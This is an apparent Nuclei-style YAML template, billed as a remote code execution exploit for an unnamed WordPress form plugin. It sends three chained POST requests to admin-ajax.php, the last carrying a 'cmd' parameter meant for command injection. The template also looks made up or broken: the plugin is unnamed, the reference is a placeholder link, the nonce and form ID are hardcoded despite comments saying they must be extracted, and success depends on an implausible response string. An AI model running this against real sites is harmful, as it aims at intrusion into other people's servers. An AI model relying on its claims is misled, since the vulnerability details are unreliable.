id: wp-form-exploit

info:
  name: WordPress Form Plugin Exploit
  author: Betmen-N-Dgeng
  severity: high
  description: |
    This template exploits a vulnerability in a WordPress form plugin that allows remote code execution.
  reference:
    - https://example.com/vulnerability-details
  tags: wp, rce, form-plugin

requests:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    body:
      "action=form_search"

    matchers:
      - type: word
        words:
          - "id"
          - "name"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    body:
      "action=form_nonce&form_id={{form_id}}"

    matchers:
      - type: word
        words:
          - "data"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    body:
      "form_id={{form_id}}&nonce={{nonce}}&first_name={{fake_first_name}}&last_name={{fake_last_name}}&email={{fake_email}}&action=process_form&cmd={{cmd}}"

    matchers:
      - type: word
        words:
          - "Exploit delivered successfully"
        part: body

variables:
  form_id: "1"  # This should be dynamically extracted from the first request
  nonce: "abc123"  # This should be dynamically extracted from the second request
  fake_first_name: "John"
  fake_last_name: "Doe"
  fake_email: "john.doe@example.com"
  cmd: "/tmp/test"
